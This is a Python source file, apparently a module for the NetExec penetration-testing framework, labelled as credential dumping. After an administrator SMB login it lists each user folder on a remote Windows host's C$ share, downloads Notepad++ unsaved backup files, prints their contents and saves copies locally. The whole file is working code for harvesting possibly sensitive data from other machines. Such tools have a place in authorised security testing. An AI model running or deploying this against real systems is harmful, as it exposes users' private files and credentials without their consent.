from io import BytesIO
from os import makedirs
from os.path import join
from pathlib import Path
from nxc.helpers.misc import CATEGORY
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH


class NXCModule:
    # Finds notepad++ unsaved backup files
    # Module by @Defte_

    name = "notepad++"
    description = "Extracts notepad++ unsaved files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]

    def options(self, context, module_options):
        """"""

    def on_admin_login(self, context, connection):
        found = 0
        for directory in connection.conn.listPath("C$", "Users\\*"):
            if directory.get_longname() not in self.false_positive and directory.is_directory():
                try:
                    notepad_backup_dir = f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Notepad++\\backup\\"
                    for file in connection.conn.listPath("C$", f"{notepad_backup_dir}\\*"):
                        file_path = f"{notepad_backup_dir}{file.get_longname()}"
                        if file.get_longname() not in self.false_positive:
                            found += 1
                            file_path = f"{notepad_backup_dir}{file.get_longname()}"
                            buf = BytesIO()
                            connection.conn.getFile("C$", file_path, buf.write)
                            buf.seek(0)
                            file_content = buf.read().decode("utf-8", errors="ignore").lower()
                            context.log.highlight(f"C:\\{file_path}")
                            for line in file_content.splitlines():
                                context.log.highlight(f"\t{line}")
                            filename = sanitize_path_component(f"{connection.host}_{directory.get_longname()}_notepad_backup_{found}.txt")
                            export_path = join(NXC_PATH, "modules", "notepad++")
                            path = Path(export_path, filename).resolve()
                            if Path(export_path).resolve() not in path.parents:
                                context.log.fail(f"Path traversal detected in {filename!r}, skipping")
                                continue
                            makedirs(export_path, exist_ok=True)
                            try:
                                with open(path, "w+") as file:
                                    file.write(file_content)
                                context.log.highlight(f"Notepad++ backup written to: {path}")
                            except Exception as e:
                                context.log.fail(f"Failed to write Notepad++ backup to {filename}: {e}")
                except Exception:
                    pass
